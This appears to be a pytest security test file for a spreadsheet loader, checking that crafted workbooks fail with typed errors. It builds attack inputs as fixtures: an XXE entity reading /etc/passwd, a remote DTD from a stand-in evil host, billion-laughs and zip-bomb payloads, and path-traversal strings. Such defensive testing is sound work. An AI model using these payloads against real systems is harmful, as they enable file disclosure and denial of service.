"""Fuzz / malicious inputs (§9 'Injection and safety', S-3..S-6). Every case must
fail closed with a *typed* error, quickly, without touching anything else."""

from __future__ import annotations

import os
import zipfile
from pathlib import Path

import pytest

from sheetguard.core.loader import load_workbook
from sheetguard.errors import (
    CorruptedFileError,
    LimitExceededError,
    NotFoundError,
    PasswordProtectedError,
    PathNotAllowedError,
    SheetGuardError,
    UnsafeContentError,
    UnsupportedFormatError,
)
from sheetguard.security.archive import OLE_MAGIC
from sheetguard.security.limits import Limits
from sheetguard.security.paths import resolve_inside_root
from tests.helpers import rewrite_zip, write_xlsx

SHEET = "xl/worksheets/sheet1.xml"


@pytest.fixture
def base(tmp_path: Path) -> Path:
    return write_xlsx(tmp_path / "base.xlsx", {"A1": 1, "B1": "=A1*2"})


def _sheet_xml(base: Path) -> bytes:
    with zipfile.ZipFile(base) as z:
        return z.read(SHEET)


def test_xxe_external_entity_rejected(base, tmp_path):
    xml = _sheet_xml(base)
    body = xml.split(b"?>", 1)[1] if xml.startswith(b"<?xml") else xml
    evil = b'<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' + body
    bad = rewrite_zip(base, tmp_path / "xxe.xlsx", replace={SHEET: evil})
    with pytest.raises(UnsafeContentError):
        load_workbook(bad)


def test_billion_laughs_rejected(base, tmp_path):
    lol = b"".join(
        b'<!ENTITY lol%d "&lol%d;&lol%d;&lol%d;">' % (i, i - 1, i - 1, i - 1) for i in range(1, 10)
    )
    evil = b'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol0 "lol">' + lol + b"]><a>&lol9;</a>"
    bad = rewrite_zip(base, tmp_path / "lol.xlsx", replace={"xl/workbook.xml": evil})
    with pytest.raises(UnsafeContentError):
        load_workbook(bad)


def test_dtd_in_rels_part_rejected(base, tmp_path):
    evil = b'<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://evil.example/x.dtd"><r/>'
    bad = rewrite_zip(base, tmp_path / "rels.xlsx", replace={"_rels/.rels": evil})
    with pytest.raises(UnsafeContentError):
        load_workbook(bad)


def test_zip_bomb_ratio(base, tmp_path):
    bomb = b"<!-- " + b"A" * (30 * 1024 * 1024) + b" -->"
    bad = rewrite_zip(base, tmp_path / "bomb.xlsx", add={"xl/media/pad.xml": bomb})
    with pytest.raises(LimitExceededError, match="compression ratio"):
        load_workbook(bad)


def test_zip_bomb_total_size(base, tmp_path):
    # Many moderately compressible members: total budget must trip, ratio check off
    limits = Limits(max_total_uncompressed_bytes=2 * 1024 * 1024, max_compression_ratio=1e9)
    parts = {f"xl/media/p{i}.bin": os.urandom(256 * 1024) for i in range(12)}
    bad = rewrite_zip(base, tmp_path / "big.xlsx", add=parts)
    with pytest.raises(LimitExceededError, match="too large"):
        load_workbook(bad, limits)


def test_member_size_limit(base, tmp_path):
    limits = Limits(max_member_uncompressed_bytes=100_000, max_compression_ratio=1e9)
    bad = rewrite_zip(base, tmp_path / "member.xlsx", add={"xl/media/x.bin": os.urandom(200_000)})
    with pytest.raises(LimitExceededError, match="part of the workbook"):
        load_workbook(bad, limits)


def test_too_many_members(base, tmp_path):
    limits = Limits(max_zip_members=20)
    bad = rewrite_zip(
        base, tmp_path / "many.xlsx", add={f"xl/media/{i}.bin": b"x" for i in range(30)}
    )
    with pytest.raises(LimitExceededError, match="too many parts"):
        load_workbook(bad, limits)


def test_lying_zip_header_does_not_bypass_limits(base, tmp_path):
    """Patch the declared uncompressed size to 1 byte; the real size must still be enforced."""
    bomb = b"<!-- " + b"B" * (30 * 1024 * 1024) + b" -->"
    bad = rewrite_zip(base, tmp_path / "liar.xlsx", add={"xl/media/liar.xml": bomb})
    raw = bytearray(bad.read_bytes())
    name = b"xl/media/liar.xml"
    for sig in (b"PK\x03\x04", b"PK\x01\x02"):
        start = 0
        while (i := raw.find(sig, start)) != -1:
            offset = 22 if sig == b"PK\x03\x04" else 24
            name_off = 30 if sig == b"PK\x03\x04" else 46
            if raw[i + name_off : i + name_off + len(name)] == name:
                raw[i + offset : i + offset + 4] = (1).to_bytes(4, "little")
            start = i + 4
    bad.write_bytes(bytes(raw))
    with pytest.raises((LimitExceededError, CorruptedFileError)):
        load_workbook(bad)


def test_file_size_limit(base):
    with pytest.raises(LimitExceededError, match="larger than"):
        load_workbook(base, Limits(max_file_bytes=100))


def test_cell_limit_enforced_before_load(tmp_path):
    path = write_xlsx(tmp_path / "cells.xlsx", {f"A{i}": i for i in range(1, 51)})
    with pytest.raises(LimitExceededError, match="more than 10 cells"):
        load_workbook(path, Limits(max_cells=10))


def test_formula_length_limit(tmp_path):
    path = write_xlsx(tmp_path / "long.xlsx", {"A1": "=" + "+".join(["1"] * 3000)})
    with pytest.raises(LimitExceededError, match="formula is longer"):
        load_workbook(path, Limits(max_formula_length=1000))


def test_sheet_count_limit(tmp_path):
    import openpyxl

    wb = openpyxl.Workbook()
    for i in range(5):
        wb.create_sheet(f"S{i}")
    wb.save(tmp_path / "sheets.xlsx")
    with pytest.raises(LimitExceededError, match="sheets"):
        load_workbook(tmp_path / "sheets.xlsx", Limits(max_sheets=3))


def test_renamed_docx(tmp_path):
    p = tmp_path / "report.xlsx"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
    with pytest.raises(CorruptedFileError, match="Word"):
        load_workbook(p)


def test_zip_that_is_not_a_workbook(tmp_path):
    p = tmp_path / "x.xlsx"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("[Content_Types].xml", "<Types><Override ContentType='text/plain'/></Types>")
        z.writestr("hello.txt", "hi")
    with pytest.raises(CorruptedFileError, match="not an Excel workbook"):
        load_workbook(p)


def test_zip_without_content_types(tmp_path):
    p = tmp_path / "y.xlsx"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("a.txt", "hi")
    with pytest.raises(CorruptedFileError, match="content types"):
        load_workbook(p)


def test_legacy_xls_rejected(tmp_path):
    p = tmp_path / "old.xls"
    p.write_bytes(OLE_MAGIC + b"\x00" * 2048)
    with pytest.raises(UnsupportedFormatError, match="Legacy"):
        load_workbook(p)


def test_password_protected_rejected(tmp_path):
    p = tmp_path / "secret.xlsx"
    p.write_bytes(OLE_MAGIC + b"\x00" * 512 + "EncryptedPackage".encode("utf-16-le") + b"\x00" * 64)
    with pytest.raises(PasswordProtectedError):
        load_workbook(p)


@pytest.mark.parametrize("ext", [".xlsb", ".ods", ".csv", ".numbers", ".txt", ""])
def test_unsupported_extensions(tmp_path, base, ext):
    p = tmp_path / f"file{ext}"
    p.write_bytes(base.read_bytes())
    with pytest.raises(UnsupportedFormatError):
        load_workbook(p)


def test_xlsb_content_with_xlsx_name(tmp_path):
    p = tmp_path / "b.xlsx"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("xl/workbook.bin", b"\x00")
    with pytest.raises(UnsupportedFormatError, match="xlsb"):
        load_workbook(p)


def test_ods_content_with_xlsx_name(tmp_path):
    p = tmp_path / "o.xlsx"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("mimetype", "application/vnd.oasis.opendocument.spreadsheet")
        z.writestr("content.xml", "<x/>")
    with pytest.raises(UnsupportedFormatError, match="OpenDocument"):
        load_workbook(p)


def test_truncated_file(base, tmp_path):
    p = tmp_path / "cut.xlsx"
    p.write_bytes(base.read_bytes()[: len(base.read_bytes()) // 2])
    with pytest.raises(CorruptedFileError):
        load_workbook(p)


def test_corrupted_member(base, tmp_path):
    raw = bytearray(base.read_bytes())
    # flip bytes in the middle of the compressed stream of some member
    for i in range(400, 460):
        raw[i] ^= 0xFF
    p = tmp_path / "flip.xlsx"
    p.write_bytes(bytes(raw))
    with pytest.raises(SheetGuardError):
        load_workbook(p)


def test_random_bytes(tmp_path):
    p = tmp_path / "noise.xlsx"
    p.write_bytes(os.urandom(4096))
    with pytest.raises(CorruptedFileError):
        load_workbook(p)


def test_empty_file(tmp_path):
    p = tmp_path / "empty.xlsx"
    p.write_bytes(b"")
    with pytest.raises(CorruptedFileError, match="empty"):
        load_workbook(p)


def test_missing_and_directory(tmp_path):
    with pytest.raises(NotFoundError):
        load_workbook(tmp_path / "nope.xlsx")
    d = tmp_path / "dir.xlsx"
    d.mkdir()
    with pytest.raises(SheetGuardError):
        load_workbook(d)


def test_encrypted_zip_member(base, tmp_path):
    raw = bytearray(base.read_bytes())
    i = raw.find(b"PK\x03\x04")
    raw[i + 6] |= 0x1  # set the "encrypted" general-purpose flag on the first member
    j = raw.find(b"PK\x01\x02")
    raw[j + 8] |= 0x1
    p = tmp_path / "enc.xlsx"
    p.write_bytes(bytes(raw))
    with pytest.raises((PasswordProtectedError, CorruptedFileError)):
        load_workbook(p)


# ------------------------------------------------------------------ path safety (S-6)


def test_path_traversal_rejected(tmp_path):
    root = tmp_path / "root"
    root.mkdir()
    (tmp_path / "secret.xlsx").write_bytes(b"x")
    with pytest.raises(PathNotAllowedError):
        resolve_inside_root("../secret.xlsx", root)
    with pytest.raises(PathNotAllowedError):
        resolve_inside_root("../../etc/passwd", root)
    with pytest.raises(PathNotAllowedError):
        resolve_inside_root(str(tmp_path / "secret.xlsx"), root)


@pytest.mark.skipif(os.name == "nt", reason="symlinks need privileges on Windows")
def test_symlink_escape_rejected(tmp_path):
    root = tmp_path / "root"
    root.mkdir()
    outside = tmp_path / "outside.xlsx"
    outside.write_bytes(b"x")
    (root / "link.xlsx").symlink_to(outside)
    with pytest.raises(PathNotAllowedError):
        resolve_inside_root("link.xlsx", root)


@pytest.mark.skipif(os.name == "nt", reason="symlinks need privileges on Windows")
def test_symlinked_root_and_inner_link_allowed(tmp_path):
    real_root = tmp_path / "real"
    real_root.mkdir()
    (real_root / "a.xlsx").write_bytes(b"x")
    (real_root / "b.xlsx").symlink_to(real_root / "a.xlsx")
    link_root = tmp_path / "linkroot"
    link_root.symlink_to(real_root)
    assert resolve_inside_root("a.xlsx", link_root) == (real_root / "a.xlsx").resolve()
    assert resolve_inside_root("b.xlsx", real_root) == (real_root / "a.xlsx").resolve()


def test_path_inputs(tmp_path):
    root = tmp_path
    (root / "ok.xlsx").write_bytes(b"x")
    (root / "sub").mkdir()
    assert resolve_inside_root("ok.xlsx", root).name == "ok.xlsx"
    with pytest.raises(PathNotAllowedError):
        resolve_inside_root("", root)
    with pytest.raises(PathNotAllowedError):
        resolve_inside_root("ok\x00.xlsx", root)
    with pytest.raises(NotFoundError):
        resolve_inside_root("missing.xlsx", root)
    with pytest.raises(PathNotAllowedError, match="regular file"):
        resolve_inside_root("sub", root)
